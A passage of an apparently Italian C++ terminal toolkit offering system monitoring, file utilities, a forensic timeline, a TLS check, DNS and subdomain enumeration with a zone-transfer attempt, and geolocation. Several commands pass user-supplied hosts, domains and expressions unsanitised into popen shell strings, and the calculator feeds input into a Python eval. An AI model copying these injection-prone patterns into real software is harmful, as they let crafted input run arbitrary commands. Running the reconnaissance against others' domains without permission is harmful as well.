        FILE* p = popen(cmd.c_str(), "r");
        if (!p) { std::cout << " errore\n"; continue; }
        char buf[64]={0}; fgets(buf,sizeof(buf),p); pclose(p);
        std::istringstream ss(buf);
        double speed=0, total=0; ss >> speed >> total;
        if (speed > 0) {
            double mbps = speed * 8.0 / 1000000.0;
            std::string col = mbps>50?Color::BGREEN:mbps>10?Color::YELLOW:Color::RED;
            // Barra visuale
            int bars = std::min((int)(mbps/2), 40);
            std::cout << "\r    " << std::left << std::setw(20) << name
                      << col << std::fixed << std::setprecision(1) << mbps << " Mbps  ["
                      << std::string(bars,'#') << Color::DIM << std::string(40-bars,'-')
                      << col << "]\n" << Color::RESET;
        } else {
            std::cout << "\r    " << std::left << std::setw(20) << name
                      << Color::DIM << "(non raggiungibile)\n" << Color::RESET;
        }
        break; // un solo test basta
    }
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: monitor — dashboard live CPU/RAM/rete/processi
// ═══════════════════════════════════════════════════════════════
void cmdMonitor(const std::vector<std::string>& args) {
    int iterations = (args.size()>=2) ? std::stoi(args[1]) : 5;
    int delay_ms   = (args.size()>=3) ? std::stoi(args[2]) : 2000;

    std::cout << Color::CYAN << "\n  📊 MONITOR SISTEMA"
              << Color::DIM << "  (aggiornamenti: " << iterations
              << "  intervallo: " << delay_ms/1000 << "s  — Ctrl+C per uscire)\n" << Color::RESET;

    for (int iter = 0; iter < iterations; iter++) {
        // Pulisce schermata parziale
        if (iter > 0) {
            // Torna su di N righe
            std::cout << "\033[20A\033[0J";
        }

        auto ts = std::time(nullptr);
        std::cout << Color::DIM << "  " << std::string(65,'-') << "\n";
        std::cout << "  🕐 " << timeStr(ts) << "  |  aggiornamento " << iter+1 << "/" << iterations << "\n";
        std::cout << "  " << std::string(65,'-') << "\n" << Color::RESET;

        // ── CPU & Load ──
        std::cout << Color::YELLOW << "  CPU / Load:\n" << Color::RESET;
        FILE* p;
#ifdef __APPLE__
        p = popen("sysctl -n vm.loadavg 2>/dev/null", "r");
#else
        p = popen("cat /proc/loadavg 2>/dev/null", "r");
#endif
        if (p) {
            char buf[128]={0}; fgets(buf,sizeof(buf),p); pclose(p);
            std::string load = trim(buf);
            // Prendi i primi 3 valori
            std::istringstream ss(load);
            double l1=0,l5=0,l15=0; ss>>l1>>l5>>l15;
            auto loadBar = [](double v, int max_cores=4) {
                int pct = std::min(100, (int)(v/max_cores*100));
                int bars = pct*30/100;
                std::string col = pct<50?Color::BGREEN:pct<80?Color::YELLOW:Color::BRED;
                return col + std::string(bars,'#') + Color::DIM + std::string(30-bars,'-') + Color::RESET
                       + " " + std::to_string(pct) + "%";
            };
            std::cout << Color::DIM << "    1m  " << Color::RESET << loadBar(l1)
                      << Color::DIM << "  avg=" << std::fixed<<std::setprecision(2)<<l1 << Color::RESET << "\n";
            std::cout << Color::DIM << "    5m  " << Color::RESET << loadBar(l5)
                      << Color::DIM << "  avg=" << l5 << Color::RESET << "\n";
            std::cout << Color::DIM << "    15m " << Color::RESET << loadBar(l15)
                      << Color::DIM << "  avg=" << l15 << Color::RESET << "\n";
        }

        // ── RAM ──
        std::cout << Color::YELLOW << "\n  RAM:\n" << Color::RESET;
#ifdef __APPLE__
        p = popen("vm_stat 2>/dev/null | head -5", "r");
        if (p) {
            char buf[512]={0}; size_t n=fread(buf,1,511,p); pclose(p);
            std::string out(buf,n);
            // page size 4096
            auto getVal = [&](const std::string& key) -> long {
                size_t pos = out.find(key);
                if (pos==std::string::npos) return 0;
                pos = out.find_first_of("0123456789", pos+key.size());
                if (pos==std::string::npos) return 0;
                return std::stol(out.substr(pos));
            };
            long free_p  = getVal("Pages free:");
            long active  = getVal("Pages active:");
            long inactive= getVal("Pages inactive:");
            long wired   = getVal("Pages wired");
            long total   = free_p+active+inactive+wired;
            long used    = active+wired;
            if (total > 0) {
                int pct = (int)((double)used/total*100);
                int bars = pct*30/100;
                std::string col = pct<60?Color::BGREEN:pct<80?Color::YELLOW:Color::BRED;
                std::cout << "    " << col << std::string(bars,'#')
                          << Color::DIM << std::string(30-bars,'-') << Color::RESET
                          << "  " << pct << "%"
                          << Color::DIM << "  (" << humanSize(used*4096LL) << " / " << humanSize(total*4096LL) << ")\n" << Color::RESET;
            }
        }
#else
        p = popen("free -b 2>/dev/null | grep Mem:", "r");
        if (p) {
            char buf[256]={0}; fgets(buf,sizeof(buf),p); pclose(p);
            std::istringstream ss(buf); std::string label;
            long long total=0,used=0,free_m=0; ss>>label>>total>>used>>free_m;
            if (total>0) {
                int pct=(int)((double)used/total*100);
                int bars=pct*30/100;
                std::string col=pct<60?Color::BGREEN:pct<80?Color::YELLOW:Color::BRED;
                std::cout<<"    "<<col<<std::string(bars,'#')
                         <<Color::DIM<<std::string(30-bars,'-')<<Color::RESET
                         <<"  "<<pct<<"%"
                         <<Color::DIM<<"  ("<<humanSize(used)<<" / "<<humanSize(total)<<")\n"<<Color::RESET;
            }
        }
#endif

        // ── Disco ──
        std::cout << Color::YELLOW << "\n  Disco:\n" << Color::RESET;
        p = popen("df -h / 2>/dev/null | tail -1", "r");
        if (p) {
            char buf[256]={0}; fgets(buf,sizeof(buf),p); pclose(p);
            std::istringstream ss(buf); std::string fs,size,used,avail,pct,mount;
            ss>>fs>>size>>used>>avail>>pct>>mount;
            std::cout << Color::DIM << "    / " << Color::RESET
                      << Color::WHITE << "usato: " << used << "  libero: " << avail
                      << "  tot: " << size << "  " << Color::YELLOW << pct << Color::RESET << "\n";
        }

        // ── Rete ──
        std::cout << Color::YELLOW << "\n  Connessioni attive:\n" << Color::RESET;
#ifdef __APPLE__
        p = popen("netstat -an 2>/dev/null | grep ESTABLISHED | wc -l", "r");
#else
        p = popen("ss -s 2>/dev/null | grep estab || netstat -an 2>/dev/null | grep ESTABLISHED | wc -l", "r");
#endif
        if (p) {
            char buf[64]={0}; fgets(buf,sizeof(buf),p); pclose(p);
            std::cout << Color::DIM << "    ESTABLISHED: " << Color::GREEN << trim(buf) << Color::RESET << "\n";
        }

        // ── Top processi ──
        std::cout << Color::YELLOW << "\n  Top 3 processi (CPU):\n" << Color::RESET;
#ifdef __APPLE__
        p = popen("ps aux 2>/dev/null | sort -rk3 | head -4 | tail -3", "r");
#else
        p = popen("ps aux --sort=-%cpu 2>/dev/null | head -4 | tail -3", "r");
#endif
        if (p) {
            char buf[256];
            while (fgets(buf,sizeof(buf),p)) {
                std::istringstream ss(buf);
                std::string user,pid,cpu,mem,rest;
                ss>>user>>pid>>cpu>>mem;
                std::getline(ss,rest);
                // Tronca nome processo
                rest = trim(rest);
                if (rest.size()>30) rest=rest.substr(0,30)+"...";
                double cpuVal=0; try{cpuVal=std::stod(cpu);}catch(...){}
                std::string col=cpuVal>50?Color::BRED:cpuVal>10?Color::YELLOW:Color::GREEN;
                std::cout << Color::DIM << "    " << std::left << std::setw(6) << pid
                          << col << std::setw(7) << cpu+"%"
                          << Color::WHITE << rest << Color::RESET << "\n";
            }
            pclose(p);
        }

        std::cout << Color::DIM << "  " << std::string(65,'-') << Color::RESET << "\n";

        if (iter < iterations-1) usleep(delay_ms * 1000);
    }
    std::cout << Color::CYAN << "\n  Monitor terminato.\n\n" << Color::RESET;
}

// ═══════════════════════════════════════════════════════════════
//  CMD: filetree — albero visuale directory
// ═══════════════════════════════════════════════════════════════
void cmdFileTree(const std::vector<std::string>& args) {
    std::string dir = (args.size()>=2) ? args[1] : ".";
    int maxDepth = 4;
    for(size_t i=2;i<args.size();i++) if(args[i]=="-d"&&i+1<args.size()) maxDepth=std::stoi(args[++i]);

    std::cout << Color::CYAN << "\n  " << dir << "\n" << Color::RESET;
    size_t fileCount=0, dirCount=0;

    std::function<void(const std::string&, const std::string&, int)> walk =
    [&](const std::string& path, const std::string& prefix, int depth) {
        if (depth > maxDepth) return;
        DIR* d = opendir(path.c_str()); if(!d) return;
        std::vector<std::string> entries;
        struct dirent* ent;
        while((ent=readdir(d))!=nullptr) {
            std::string n=ent->d_name;
            if(n=="."||n=="..") continue;
            entries.push_back(n);
        }
        closedir(d);
        std::sort(entries.begin(),entries.end());

        for(size_t i=0;i<entries.size();i++) {
            bool last = (i==entries.size()-1);
            std::string full = path+"/"+entries[i];
            struct stat st; stat(full.c_str(),&st);
            bool isDir = S_ISDIR(st.st_mode);

            std::cout << Color::DIM << prefix << (last?"└── ":"├── ") << Color::RESET;
            if(isDir) { std::cout<<Color::BCYAN<<entries[i]<<"/"<<Color::RESET; dirCount++; }
            else {
                // Colore per estensione
                std::string ext; auto dot=entries[i].rfind('.'); if(dot!=std::string::npos) ext=toLower(entries[i].substr(dot));
                std::string col = (ext==".cpp"||ext==".h"||ext==".py"||ext==".js") ? Color::GREEN :
                                  (ext==".jpg"||ext==".png"||ext==".gif") ? Color::MAGENTA :
                                  (ext==".pdf"||ext==".doc"||ext==".docx") ? Color::YELLOW :
                                  (ext==".zip"||ext==".gz"||ext==".tar") ? Color::RED : Color::WHITE;
                std::cout << col << entries[i] << Color::DIM << "  " << humanSize(st.st_size) << Color::RESET;
                fileCount++;
            }
            std::cout << "\n";
            if(isDir) walk(full, prefix+(last?"    ":"│   "), depth+1);
        }
    };
    walk(dir, "", 0);
    std::cout << Color::DIM << "\n  " << dirCount << " cartelle, " << fileCount << " file\n\n" << Color::RESET;
}

// ═══════════════════════════════════════════════════════════════
//  CMD: duplicates — trova file duplicati via hash
// ═══════════════════════════════════════════════════════════════
void cmdDuplicates(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: duplicates <dir>\n"<<Color::RESET;return;}
    std::string dir = args[1];
    std::cout << Color::CYAN << "\n  DUPLICATI IN: " << dir << "\n" << Color::RESET;
    std::cout << Color::DIM << "  Calcolo hash...\n" << Color::RESET;

    std::vector<FileEntry> files;
    scanDir(dir, files, "", true);

    std::map<std::string, std::vector<std::string>> byHash;
    for(auto& fe : files) {
        std::string h = MD5::hashFile(fe.path);
        byHash[h].push_back(fe.path);
    }

    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;
    int groups=0; size_t wastedBytes=0;
    for(auto& p : byHash) {
        if(p.second.size()<2) continue;
        groups++;
        struct stat st; stat(p.second[0].c_str(),&st);
        wastedBytes += st.st_size * (p.second.size()-1);
        std::cout << Color::YELLOW << "  [MD5: " << p.first.substr(0,16) << "...] "
                  << Color::DIM << humanSize(st.st_size) << Color::RESET << "\n";
        for(auto& f : p.second)
            std::cout << Color::WHITE << "    " << f << Color::RESET << "\n";
    }
    if(groups==0) std::cout << Color::GREEN << "  Nessun duplicato trovato.\n" << Color::RESET;
    else std::cout << Color::YELLOW << "\n  Gruppi duplicati: " << groups
                   << "  Spazio sprecato: " << humanSize(wastedBytes) << Color::RESET << "\n";
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: bigfiles — trova i file più grandi
// ═══════════════════════════════════════════════════════════════
void cmdBigFiles(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: bigfiles <dir> [n]\n"<<Color::RESET;return;}
    std::string dir=args[1];
    int n=(args.size()>=3)?std::stoi(args[2]):10;

    std::vector<FileEntry> files;
    scanDir(dir, files, "", true);
    std::sort(files.begin(),files.end(),[](const FileEntry& a,const FileEntry& b){return a.size>b.size;});

    std::cout << Color::CYAN << "\n  TOP " << n << " FILE PIU' GRANDI IN: " << dir << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;
    for(int i=0;i<n&&i<(int)files.size();i++) {
        int barLen = (int)((double)files[i].size/files[0].size*30);
        std::cout << Color::YELLOW << "  " << std::setw(3) << i+1 << ". "
                  << Color::GREEN << std::string(barLen,'#') << Color::DIM << std::string(30-barLen,'-')
                  << Color::WHITE << "  " << std::setw(10) << humanSize(files[i].size)
                  << "  " << files[i].path << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: timeline — analisi temporale stile Autopsy
// ═══════════════════════════════════════════════════════════════
void cmdTimelineAdv(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: timeline2 <dir> [--days N] [--type file|dir|all]\n"<<Color::RESET;return;}
    std::string dir=args[1];
    int days=30;
    std::string typeFilter="all";
    for(size_t i=2;i<args.size();i++){
        if(args[i]=="--days"&&i+1<args.size()) days=std::stoi(args[++i]);
        if(args[i]=="--type"&&i+1<args.size()) typeFilter=args[++i];
    }

    std::vector<FileEntry> files;
    scanDir(dir, files, "", true);
    std::sort(files.begin(),files.end(),[](const FileEntry& a,const FileEntry& b){return a.mtime>b.mtime;});

    time_t now=time(nullptr);
    time_t cutoff=now-(days*86400);

    std::cout << Color::CYAN << "\n  TIMELINE FORENSE: " << dir << Color::DIM << " (ultimi " << days << " giorni)\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(70,'-') << "\n" << Color::RESET;

    // Raggruppa per giorno
    std::map<std::string,std::vector<FileEntry>> byDay;
    for(auto& fe:files) {
        if(fe.mtime < cutoff) continue;
        char buf[11]; struct tm* t=localtime(&fe.mtime);
        strftime(buf,sizeof(buf),"%Y-%m-%d",t);
        byDay[std::string(buf)].push_back(fe);
    }

    // Timeline ASCII grafica
    std::cout << Color::YELLOW << "  ATTIVITA' PER GIORNO:\n" << Color::RESET;
    int maxDay=0;
    for(auto& p:byDay) if((int)p.second.size()>maxDay) maxDay=p.second.size();

    for(auto it=byDay.rbegin();it!=byDay.rend();++it) {
        int barLen = maxDay>0?(int)((double)it->second.size()/maxDay*40):0;
        std::string col = it->second.size()>10?Color::RED:it->second.size()>5?Color::YELLOW:Color::GREEN;
        std::cout << Color::WHITE << "  " << it->first << " "
                  << col << std::string(barLen,'#') << Color::DIM << std::string(40-barLen,'-')
                  << Color::WHITE << " " << it->second.size() << " file\n" << Color::RESET;
    }

    std::cout << Color::YELLOW << "\n  FILE RECENTI:\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(70,'-') << "\n" << Color::RESET;
    int shown=0;
    for(auto& fe:files) {
        if(fe.mtime<cutoff || shown>=50) break;
        time_t diff=now-fe.mtime;
        std::string age;
        if(diff<3600) age=std::to_string(diff/60)+"m fa";
        else if(diff<86400) age=std::to_string(diff/3600)+"h fa";
        else age=std::to_string(diff/86400)+"g fa";

        std::string col=diff<3600?Color::BRED:diff<86400?Color::YELLOW:Color::WHITE;
        std::cout<<col<<"  "<<timeStr(fe.mtime)<<"  "<<Color::DIM<<std::setw(8)<<humanSize(fe.size)
                 <<"  "<<Color::WHITE<<fe.path<<Color::RESET<<"\n";
        shown++;
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: sslscan — analisi cipher suite TLS
// ═══════════════════════════════════════════════════════════════
void cmdSslScan(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: sslscan2 <host> [porta]\n"<<Color::RESET;return;}
    std::string host=args[1];
    std::string port=(args.size()>=3)?args[2]:"443";

    std::cout << Color::CYAN << "\n  SSL/TLS SCAN: " << host << ":" << port << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    // Usa openssl s_client per info base
    std::string cmd = "openssl s_client -connect " + host + ":" + port +
                      " -brief 2>&1 < /dev/null";
    FILE* p = popen(cmd.c_str(),"r");
    if(p){
        char buf[512]; std::string out;
        while(fgets(buf,sizeof(buf),p)) out+=buf;
        pclose(p);

        // Parse output
        auto printLine=[&](const std::string& key, const std::string& searchKey, const std::string& col){
            size_t pos=out.find(searchKey);
            if(pos!=std::string::npos){
                size_t end=out.find('\n',pos);
                std::string val=trim(out.substr(pos,end-pos));
                std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(20)<<key<<col<<val<<Color::RESET<<"\n";
            }
        };
        printLine("Protocollo",    "Protocol  :",  Color::GREEN);
        printLine("Cipher",        "Cipher    :",  Color::WHITE);
        printLine("Certificato",   "Server certificate", Color::WHITE);
        printLine("Soggetto",      "subject=",     Color::WHITE);
        printLine("Emittente",     "issuer=",      Color::DIM);
        printLine("Scadenza",      "notAfter=",    Color::YELLOW);

        // Controlla vulnerabilità note
        std::cout << Color::YELLOW << "\n  CHECK VULNERABILITA':\n" << Color::RESET;
        auto chk=[&](const std::string& name, const std::string& testFlags, bool wantFail){
            std::string c="openssl s_client -connect "+host+":"+port+" "+testFlags+" 2>&1 < /dev/null";
            FILE* pp=popen(c.c_str(),"r"); if(!pp) return;
            std::string o; char b[256]; while(fgets(b,sizeof(b),pp)) o+=b; pclose(pp);
            bool connected=(o.find("CONNECTED")!=std::string::npos);
            bool vuln=(wantFail?connected:!connected);
            std::cout<<(vuln?Color::BRED+"  [VULN] ":Color::GREEN+"  [ OK ] ")
                     <<Color::WHITE<<name<<Color::RESET<<"\n";
        };
        chk("SSLv3 (POODLE)",    "-ssl3", true);
        chk("TLSv1.0",           "-tls1", true);
        chk("TLSv1.1",           "-tls1_1", true);
        chk("TLSv1.2 supportato","-tls1_2", false);
        chk("TLSv1.3 supportato","-tls1_3", false);
    }

    // Certificato dettagliato
    std::cout << Color::YELLOW << "\n  CERTIFICATO:\n" << Color::RESET;
    std::string certCmd = "echo | openssl s_client -connect "+host+":"+port+" 2>/dev/null | openssl x509 -noout -text 2>&1 | head -30";
    FILE* cp=popen(certCmd.c_str(),"r");
    if(cp){
        char buf[512];
        while(fgets(buf,sizeof(buf),cp))
            std::cout<<Color::DIM<<"  "<<buf<<Color::RESET;
        pclose(cp);
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: dnsenum — enumerazione sottodomini
// ═══════════════════════════════════════════════════════════════
void cmdDnsEnum(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: dnsenum <dominio>\n"<<Color::RESET;return;}
    std::string domain=args[1];
    std::cout << Color::CYAN << "\n  DNS ENUMERATION: " << domain << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    // Record principali
    std::vector<std::pair<std::string,std::string>> records={
        {"A","A"},{"AAAA","AAAA"},{"MX","MX"},{"NS","NS"},
        {"TXT","TXT"},{"CNAME","CNAME"},{"SOA","SOA"},{"PTR","PTR"}
    };
    std::cout << Color::YELLOW << "  RECORD DNS:\n" << Color::RESET;
    for(auto& r:records){
        FILE* p=popen(("dig +short "+r.second+" "+domain+" 2>/dev/null").c_str(),"r");
        if(!p) continue;
        char buf[512]; std::string out;
        while(fgets(buf,sizeof(buf),p)) out+=buf;
        pclose(p);
        out=trim(out);
        if(!out.empty())
            std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(8)<<r.first<<Color::GREEN<<out<<Color::RESET<<"\n";
    }

    // Zone transfer
    std::cout << Color::YELLOW << "\n  ZONE TRANSFER (AXFR):\n" << Color::RESET;
    FILE* p=popen(("dig @ns1."+domain+" "+domain+" AXFR 2>&1 | head -20").c_str(),"r");
    if(p){char buf[256];bool found=false;
        while(fgets(buf,sizeof(buf),p)){std::string l(buf);
            if(l.find("Transfer failed")==std::string::npos&&l.find(";;")==std::string::npos){
                std::cout<<Color::GREEN<<"  "<<l<<Color::RESET;found=true;}
        }
        pclose(p);
        if(!found) std::cout<<Color::DIM<<"  Zone transfer non permesso (normale).\n"<<Color::RESET;
    }

    // Sottodomini comuni
    std::cout << Color::YELLOW << "\n  SOTTODOMINI COMUNI:\n" << Color::RESET;
    std::vector<std::string> subs={"www","mail","ftp","vpn","api","admin","dev","test",
        "staging","beta","app","shop","portal","m","mobile","cdn","static","assets","blog","forum"};
    int found=0;
    for(auto& sub:subs){
        std::string full=sub+"."+domain;
        struct addrinfo hints{},*res=nullptr;
        hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
        if(getaddrinfo(full.c_str(),nullptr,&hints,&res)==0){
            char ip[INET6_ADDRSTRLEN]={0};
            if(res->ai_family==AF_INET)
                inet_ntop(AF_INET,&((struct sockaddr_in*)res->ai_addr)->sin_addr,ip,sizeof(ip));
            else
                inet_ntop(AF_INET6,&((struct sockaddr_in6*)res->ai_addr)->sin6_addr,ip,sizeof(ip));
            std::cout<<Color::BGREEN<<"  [+] "<<Color::WHITE<<std::left<<std::setw(30)<<full
                     <<Color::GREEN<<ip<<Color::RESET<<"\n";
            freeaddrinfo(res); found++;
        }
    }
    if(!found) std::cout<<Color::DIM<<"  Nessun sottodominio comune trovato.\n"<<Color::RESET;
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: geoip — geolocalizzazione IP
// ═══════════════════════════════════════════════════════════════
void cmdGeoIpLite(const std::vector<std::string>& args) {
    if(args.size()<2){std::cout<<Color::YELLOW<<"Uso: geoip2 <ip|hostname>\n"<<Color::RESET;return;}
    std::string target=args[1];

    // Risolvi hostname in IP
    struct addrinfo hints{},*res=nullptr;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    std::string ip=target;
    if(getaddrinfo(target.c_str(),nullptr,&hints,&res)==0){
        char buf[INET6_ADDRSTRLEN]={0};
        if(res->ai_family==AF_INET)
            inet_ntop(AF_INET,&((struct sockaddr_in*)res->ai_addr)->sin_addr,buf,sizeof(buf));
        else
            inet_ntop(AF_INET6,&((struct sockaddr_in6*)res->ai_addr)->sin6_addr,buf,sizeof(buf));
        ip=buf; freeaddrinfo(res);
    }

    std::cout << Color::CYAN << "\n  GEOIP: " << target;
    if(ip!=target) std::cout << " -> " << ip;
    std::cout << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;

    // Usa ipinfo.io via curl
    std::string cmd="curl -s --max-time 5 'https://ipinfo.io/"+ip+"/json' 2>/dev/null";
    FILE* p=popen(cmd.c_str(),"r");
    if(p){
        std::string out; char buf[512];
        while(fgets(buf,sizeof(buf),p)) out+=buf;
        pclose(p);

        // Parse JSON manuale
        auto extractJson=[&](const std::string& key)->std::string{
            std::string search="\""+key+"\":\"";
            size_t pos=out.find(search);
            if(pos==std::string::npos) return "";
            pos+=search.size();
            size_t end=out.find('"',pos);
            return out.substr(pos,end-pos);
        };

        auto print=[&](const std::string& label, const std::string& key, const std::string& col=Color::WHITE){
            std::string val=extractJson(key);
            if(!val.empty()) std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(14)<<label<<col<<val<<Color::RESET<<"\n";
        };

        print("IP",       "ip",       Color::GREEN);
        print("Hostname", "hostname");
        print("Citta'",   "city",     Color::CYAN);
        print("Regione",  "region");
        print("Paese",    "country",  Color::BYELLOW);
        print("Posizione","loc",      Color::DIM);
        print("ISP/Org",  "org",      Color::WHITE);
        print("Timezone", "timezone", Color::DIM);

        // Prova reverse DNS
        char host[NI_MAXHOST]={0};
        struct sockaddr_in sa{}; sa.sin_family=AF_INET; inet_pton(AF_INET,ip.c_str(),&sa.sin_addr);
        if(getnameinfo((struct sockaddr*)&sa,sizeof(sa),host,sizeof(host),nullptr,0,0)==0&&strlen(host)>0)
            std::cout<<Color::YELLOW<<"  Reverse DNS  "<<Color::DIM<<host<<Color::RESET<<"\n";
    } else {
        std::cout<<Color::DIM<<"  curl non disponibile. Installa curl per geolocalizzazione.\n"<<Color::RESET;
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: calc — calcolatrice con operazioni bitwise
// ═══════════════════════════════════════════════════════════════
void cmdCalc(const std::vector<std::string>& args) {
    if(args.size()<2){
        std::cout<<Color::YELLOW<<"Uso: calc <espressione>\n"
                 <<"  Es: calc 2+2   calc 0xFF & 0x0F   calc 1024*1024   calc 2^10\n"
                 <<"  Es: calc 255 hex   calc 1024 bin   calc 0b11111111 dec\n"<<Color::RESET;
        return;
    }

    // Ricostruisce espressione
    std::string expr;
    for(size_t i=1;i<args.size();i++){if(i>1)expr+=" ";expr+=args[i];}

    std::cout<<Color::CYAN<<"\n  CALC: "<<expr<<"\n"<<Color::RESET;
    std::cout<<Color::DIM<<"  "<<std::string(45,'-')<<"\n"<<Color::RESET;

    // Conversioni base
    std::string last=toLower(args.back());
    if((last=="hex"||last=="bin"||last=="oct"||last=="dec")&&args.size()>=3){
        std::string numStr=args[args.size()-2];
        long long num=0;
        try{
            if(numStr.size()>2&&numStr.substr(0,2)=="0x") num=std::stoll(numStr.substr(2),nullptr,16);
            else if(numStr.size()>2&&numStr.substr(0,2)=="0b") num=std::stoll(numStr.substr(2),nullptr,2);
            else num=std::stoll(numStr);
        } catch(...){num=0;}

        std::cout<<Color::YELLOW<<"  Decimale : "<<Color::WHITE<<num<<Color::RESET<<"\n";
        std::cout<<Color::YELLOW<<"  Hex      : "<<Color::GREEN<<"0x"<<std::hex<<std::uppercase<<num<<std::dec<<Color::RESET<<"\n";
        std::cout<<Color::YELLOW<<"  Ottale   : "<<Color::WHITE<<"0"<<std::oct<<num<<std::dec<<Color::RESET<<"\n";
        // Binario manuale
        std::string bin;
        unsigned long long unum=(unsigned long long)num;
        if(unum==0) bin="0";
        else { while(unum>0){bin=(char)('0'+(unum&1))+bin;unum>>=1;} }
        std::cout<<Color::YELLOW<<"  Binario  : "<<Color::WHITE<<"0b"<<bin<<Color::RESET<<"\n";
        // Dimensioni
        if(num>=0) {
            std::cout<<Color::YELLOW<<"  Bytes    : "<<Color::DIM<<humanSize(num)<<Color::RESET<<"\n";
        }
        std::cout<<"\n"; return;
    }

    // Valuta espressione con bc
    std::string bcExpr=expr;
    // Sostituisce ^ con ** per bc, ** con ^
    for(auto& pair:std::vector<std::pair<std::string,std::string>>{{"0x","0x"},{"**","^"}}){}
    // Usa python3 come eval sicuro
    std::string pyExpr=expr;
    // Sostituisce operatori bitwise comuni
    std::string cmd="python3 -c \"import sys; expr='"+pyExpr+"'; "
                    "result=eval(expr.replace('0b','0B')); "
                    "print(f'  Risultato : {result}'); "
                    "print(f'  Hex       : {hex(int(result))}'); "
                    "print(f'  Binario   : {bin(int(result))}')\" 2>&1";
    FILE* p=popen(cmd.c_str(),"r");
    if(p){
        char buf[256];
        while(fgets(buf,sizeof(buf),p)) std::cout<<Color::WHITE<<buf<<Color::RESET;
        pclose(p);
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: note / notes — appunti di sessione
// ═══════════════════════════════════════════════════════════════
static std::vector<std::pair<std::string,std::string>> g_notes; // {timestamp, testo}

void cmdNote(const std::vector<std::string>& args) {
    if(args.size()<2||toLower(args[0])=="notes"){
        if(g_notes.empty()){std::cout<<Color::DIM<<"\n  Nessun appunto. Usa: note <testo>\n\n"<<Color::RESET;return;}
        std::cout<<Color::CYAN<<"\n  APPUNTI SESSIONE ("<<g_notes.size()<<")\n"<<Color::RESET;
        std::cout<<Color::DIM<<"  "<<std::string(55,'-')<<"\n"<<Color::RESET;
        for(size_t i=0;i<g_notes.size();i++)
            std::cout<<Color::DIM<<"  ["<<std::setw(2)<<i+1<<"] "<<g_notes[i].first<<"  "
                     <<Color::WHITE<<g_notes[i].second<<Color::RESET<<"\n";
        std::cout<<"\n"; return;
    }
    if(toLower(args[1])=="clear"){g_notes.clear();std::cout<<Color::GREEN<<"  Appunti cancellati.\n\n"<<Color::RESET;return;}
    if(toLower(args[1])=="del"&&args.size()>=3){
        int idx=std::stoi(args[2])-1;
        if(idx>=0&&idx<(int)g_notes.size()){g_notes.erase(g_notes.begin()+idx);std::cout<<Color::GREEN<<"  Rimosso.\n\n"<<Color::RESET;}
        return;
    }

    std::string text;
    for(size_t i=1;i<args.size();i++){if(i>1)text+=" ";text+=args[i];}
    time_t now=time(nullptr);
    char buf[20]; struct tm* t=localtime(&now); strftime(buf,sizeof(buf),"%H:%M:%S",t);
    g_notes.push_back({std::string(buf),text});
    std::cout<<Color::BGREEN<<"  Appunto salvato ["<<g_notes.size()<<"]\n\n"<<Color::RESET;
}

// ═══════════════════════════════════════════════════════════════
//  ALIAS — alias comandi personalizzati
// ═══════════════════════════════════════════════════════════════
static std::map<std::string,std::string> g_aliases;

void cmdAlias(const std::vector<std::string>& args) {
    if(args.size()<2){
        // Mostra alias
        if(g_aliases.empty()){std::cout<<Color::DIM<<"\n  Nessun alias. Usa: alias <nome> <comando>\n\n"<<Color::RESET;return;}
        std::cout<<Color::CYAN<<"\n  ALIAS DEFINITI\n"<<Color::RESET;
        std::cout<<Color::DIM<<"  "<<std::string(45,'-')<<"\n"<<Color::RESET;
        for(auto& p:g_aliases)
            std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(15)<<p.first
                     <<Color::WHITE<<"= "<<p.second<<Color::RESET<<"\n";
        std::cout<<"\n"; return;
    }
    if(toLower(args[1])=="del"&&args.size()>=3){
        g_aliases.erase(args[2]);std::cout<<Color::GREEN<<"  Alias rimosso.\n\n"<<Color::RESET;return;
    }
    if(args.size()<3){std::cout<<Color::YELLOW<<"  Uso: alias <nome> <comando>\n\n"<<Color::RESET;return;}
    std::string name=args[1];
    std::string cmd; for(size_t i=2;i<args.size();i++){if(i>2)cmd+=" ";cmd+=args[i];}
    g_aliases[name]=cmd;
    std::cout<<Color::BGREEN<<"  Alias creato: "<<Color::WHITE<<name<<Color::YELLOW<<" = "<<cmd<<Color::RESET<<"\n\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: volatility wrapper
// ═══════════════════════════════════════════════════════════════
void cmdVolatility(const std::vector<std::string>& args) {
    if(args.size()<2){
        std::cout<<Color::YELLOW<<"Uso: vol <dump.mem> [plugin]\n"
                 <<"  Plugin comuni:\n"
                 <<"    pslist     — lista processi\n"
                 <<"    pstree     — albero processi\n"
                 <<"    netscan    — connessioni di rete\n"
                 <<"    cmdline    — argomenti linea di comando\n"
